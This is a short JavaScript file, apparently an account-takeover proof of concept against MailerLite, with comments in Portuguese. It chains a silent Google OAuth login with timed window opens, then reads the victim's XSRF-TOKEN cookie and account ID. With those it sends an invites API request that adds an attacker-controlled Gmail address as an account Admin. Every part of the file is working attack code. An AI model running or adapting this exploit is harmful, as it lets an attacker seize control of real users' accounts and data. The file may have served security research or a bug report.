// Primeiro timeout: após 1 segundo, redireciona para o Google Auth
setTimeout(function() {
    if (window.top.location.search == "?start") {
        window.top.open("https://accounts.google.com/o/oauth2/v2/auth?as=AKF4tMmt3F52VXAA2Fq_tzFAUy9PRbyAzPqfTtLvsYI&client_id=588658642171-uatqq7pju7oriee4dhnno0f8oeekc047.apps.googleusercontent.com&scope=openid%20email%20profile&response_type=id_token&gsiwebsdk=gis_attributes&redirect_uri=https%3A%2F%2Faccounts.mailerlite.com%2Fauth%2Fgoogle%2Fcallback&response_mode=form_post&display=page&prompt=none&gis_params=Ch9odHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tEjRodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tL2F1dGgvZ29vZ2xlL2NhbGxiYWNrGAciEGMyZGNiZDYwOGQzMTE4MzkqK0FLRjR0TW10M0Y1MlZYQUEyRnFfdHpGQVV5OVBSYnlBelBxZlR0THZzWUkySDU4ODY1ODY0MjE3MS11YXRxcTdwanU3b3JpZWU0ZGhubm8wZjhvZWVrYzA0Ny5hcHBzLmdvb2dsZXVzZXJjb250ZW50LmNvbTgCWiBodHRwczovL2FjY291bnRzLm1haWxlcmxpdGUuY29tLw");
        }
}, 1000);

// Segundo timeout: após 6 segundos, só redireciona se não estiver com ?ato
setTimeout(function() {
    if (window.top.location.search == "?start") {
        window.top.open("https://dashboard.mailerlite.com/products/168076388836836860/checkout/edit?ato");
    }
}, 6000);

// Na dashboard, com ?ato, executa o fetch após 4 segundos
if (window.location.search === "?ato") {
    setTimeout(function() {
        try {
            const xsrfToken = decodeURIComponent(window.top.document.cookie.match(/XSRF-TOKEN=([^;]+)/)[1]);
            const accountId = window.top.document.querySelector('meta[name="account-id"]').getAttribute('content');
        
            fetch('https://dashboard.mailerlite.com/api/invites', {
                method: 'PUT',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json, text/plain, */*',
                    'X-Xsrf-Token': xsrfToken,
                    'X-Requested-With': 'XMLHttpRequest',
                    'X-Acc-Id': accountId
                },
                body: JSON.stringify({
                    role: "Admin",
                    permissions: [],
                    campaigns: [],
                    requires_periodic_password_change: true,
                    email: "gustavoribeirounic@gmail.com",
                }),
                credentials: 'include'
            });
        } catch(e) {
            console.error("Erro ao executar o fetch:", e);
        }
    }, 7000);
}
